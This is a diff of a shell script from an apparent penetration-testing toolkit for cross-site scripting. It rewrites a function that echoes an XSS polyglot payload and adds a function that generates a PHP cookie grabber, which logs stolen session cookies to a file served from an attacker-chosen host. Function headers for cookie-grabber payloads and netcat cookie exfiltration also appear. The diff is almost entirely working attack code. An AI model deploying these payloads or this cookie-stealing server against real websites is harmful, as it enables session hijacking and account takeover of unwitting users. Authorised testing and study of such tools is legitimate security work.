@@ -4,21 +4,30 @@
 # qq-enum-web-xss
 #############################################################
 
-
-
-
 qq-enum-web-xss-polyglot() {
-    echo "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
+    echo "${__XSS_POLYGLOT}"
 }
 
-
-
-
-
-__XSS_POLY=$(cat << END 
-
+__XSS_POLYGLOT=$(cat << END 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 END
 )
+
+qq-enum-web-xss-grabber-host() {
+    local l && read "l?LHOST: "
+
+cat <<EOF | tee grabber.php
+<?php
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fclose($fp);
+?>s
+EOF
+
+    print -z "php -S ${l}:80"
+}
+
 
 qq-enum-web-xss-grabber-payloads(){
 echo $(cat << END 
@@ -29,11 +38,6 @@ echo $(cat << END
 END
 )
 }
-
-
-
-
-
 
 qq-enum-web-xss-exfil-cookie-netcat() {
     local l && read "l?LHOST: "
